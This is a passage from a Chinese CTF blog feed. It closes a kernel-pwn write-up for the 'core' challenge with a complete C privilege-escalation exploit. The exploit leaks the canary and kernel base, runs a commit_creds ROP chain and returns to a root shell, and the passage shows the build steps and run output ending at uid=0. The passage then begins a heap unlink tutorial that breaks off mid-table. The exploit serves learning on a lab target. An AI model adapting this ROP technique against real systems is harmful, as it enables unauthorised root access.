    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8101aa6a</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov rdi, rax ; call rdx</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a012da</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//swapgs ; popfq ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81050ac2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//iretq</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop_buf<span class="token punctuation">,</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889a</span><span class="token punctuation">,</span><span class="token number">0xffffffffffff0000</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>要注意在getshell前，提前save_state </p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_ss<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_rflags<span class="token punctuation">;</span>
size_t commit_creds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
size_t raw_vmlinux_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>
size_t vmlinux_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
size_t <span class="token function">find_symbols</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FILE<span class="token operator">*</span> kallsyms_fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/kallsyms"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>kallsyms_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]open kallsyms error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> kallsyms_fd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>commit_creds <span class="token operator">&amp;</span> prepare_kernel_cred<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"commit_creds"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>commit_creds<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">/* puts(buf); */</span>
            <span class="token keyword">char</span> hex<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token function">strncpy</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* printf("hex: %s\n", hex); */</span>
            <span class="token function">sscanf</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> <span class="token string">"%llx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"commit_creds addr: %p\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>

            vmlinux_base <span class="token operator">=</span> commit_creds <span class="token operator">-</span> <span class="token number">0x9c8e0</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"vmlinux_base addr: %p\n"</span><span class="token punctuation">,</span> vmlinux_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"prepare_kernel_cred"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>prepare_kernel_cred<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">/* puts(buf); */</span>
            <span class="token keyword">char</span> hex<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token function">strncpy</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sscanf</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> <span class="token string">"%llx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred addr: %p\n"</span><span class="token punctuation">,</span> prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
            vmlinux_base <span class="token operator">=</span> prepare_kernel_cred <span class="token operator">-</span> <span class="token number">0x9cce0</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* printf("vmlinux_base addr: %p\n", vmlinux_base); */</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>prepare_kernel_cred <span class="token operator">&amp;</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span>
    <span class="token string">"movq %%cs, %0\n"</span>
    <span class="token string">"movq %%ss, %1\n"</span>
    <span class="token string">"pushfq\n"</span>
    <span class="token string">"popq %2\n"</span>
    <span class="token punctuation">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> fd  <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/core"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"open core error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} fd: %d\n"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">find_symbols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} set off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy to user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889b</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> offset <span class="token operator">=</span> vmlinux_base <span class="token operator">-</span> raw_vmlinux_base<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} canary: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} leak offset: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> rop_buf<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>rop_buf<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//rbx</span>
    <span class="token comment" spellcheck="true">//ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81000b2f</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdi ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109cce0</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//prepare_kernel_cred</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810a0f49</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdx ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109c8e0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//commit_creds</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8101aa6a</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov rdi, rax ; call rdx</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a012da</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//swapgs ; popfq ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81050ac2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//iretq</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>


    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy from user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop_buf<span class="token punctuation">,</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} lets rop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889a</span><span class="token punctuation">,</span><span class="token number">0xffffffffffff0000</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>use gcc make it </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -g exp.c -o exp
</code></pre>
<p>将编译好的exp放入解包后德tmp目录里 并且重新打包</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">ls</span>
bin       core.id2  core.til     init   linuxrc  sbin  usr
core.id0  core.ko   etc          lib    proc     sys   vmlinux
core.id1  core.nam  gen_cpio.sh  lib64  root     tmp
➜  core ./gen_cpio.sh core.cpio
<span class="token keyword">.</span>
./vmlinux
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
./lib64
./lib64/libm.so.6
./lib64/ld-linux-x86-64.so.2
./lib64/libc.so.6
./sys
125600 块

➜  core <span class="token function">mv</span> core.cpio <span class="token punctuation">..</span>/
</code></pre>
<p>运行exp 成功提权</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">cd</span> <span class="token punctuation">..</span>
➜  give_to_player ./start.sh 
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx <span class="token punctuation">[</span>bit 5<span class="token punctuation">]</span>
<span class="token punctuation">[</span>    0.026145<span class="token punctuation">]</span> Spectre V2 <span class="token keyword">:</span> Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending <span class="token keyword">select</span> <span class="token keyword">for</span> 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease <span class="token function">time</span> 86400
/ $ 
/$ <span class="token function">id</span>
uid<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span> gid<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span> groups<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span>
/$ <span class="token function">cd</span> tmp
/$ ./exp
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> fd: 3
commit_creds addr: 0xffffffff9869c8e0
vmlinux_base addr: 0xffffffff98600000
prepare_kernel_cred addr: 0xffffffff9869cce0
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> <span class="token keyword">set</span> off
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> ret: 0
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> copy to user
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> ret: 0
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> canary: 0x3b35ff2e9fa44700
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> leak offset: 0x17600000
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> copy from user
<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> lets rop
/tmp <span class="token comment" spellcheck="true"># id</span>
uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>还是有很多不懂得地方，边学习边记录 </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感谢CTF-wiki、P4nda、Veritas501  收获很大&lt;/p&gt;
&lt;p&gt;首先捋清kernel pwn 与 用户态下的pwn的区别&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;f
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>unlink-stkof</title>
    <link href="http://iosmosis.github.io/2018/11/16/unlink-stkof/"/>
    <id>http://iosmosis.github.io/2018/11/16/unlink-stkof/</id>
    <published>2018-11-16T14:23:53.000Z</published>
    <updated>2018-11-18T15:26:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先理解下unlink操作 </p>
<p>初始三个chunk大小都为0x80</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>chunk2</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=before_PRE_size</td>
<td></td>
<td>BK=before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>接着进行unlink操作</p>
<p>令chunk1  FD =&gt; chunk3  PRE_size<br>令chunk3  BK =&gt; chunk1 PRE_size</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>chunk2</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
<td><strong>__</strong></td>
<td>PRE_size</td>
</tr>
<tr>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
<td></td>
<td>SIZE=0x80</td>
</tr>
<tr>
<td>FD=next_next_PRE_size</td>
<td></td>
<td>FD=next_PRE_size</td>
<td></td>
<td>FD=0x0</td>
</tr>
<tr>
<td>BK=0x0</td>
<td></td>
<td>BK=before_PRE_size</td>
<td></td>
<td>BK=before_before_PRE_size</td>
</tr>
<tr>
<td>String</td>
<td></td>
<td>String</td>
<td></td>
<td>String</td>
</tr>
</tbody>
</table>
<p>执行unlink 后</p>
<table>
<thead>
<tr>
<th>chunk1</th>
<th></th>
<th>chunk3</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRE_size</td>
